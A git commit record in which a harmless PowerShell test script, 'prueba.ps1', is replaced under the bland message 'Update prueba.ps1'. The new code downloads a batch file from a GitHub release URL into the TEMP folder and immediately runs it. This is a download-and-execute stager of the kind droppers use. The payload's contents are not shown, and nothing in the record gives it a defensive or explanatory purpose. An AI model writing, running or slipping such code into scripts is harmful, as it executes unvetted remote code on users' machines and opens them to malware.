8dd3dac669e1f9f899bf84d22e9ce6e39cab9cda
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-04-24 15:52:15 -0400

    Update prueba.ps1

--- prueba.ps1
+++ prueba.ps1
@@ -1,2 +1,7 @@
-Write-Host "¡El script se ejecutó correctamente!"
-Pause
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola3/final.bat"
+$destino = "$env:TEMP\final.bat"
+
+Invoke-WebRequest -Uri $url -OutFile $destino
+Start-Process -FilePath $destino
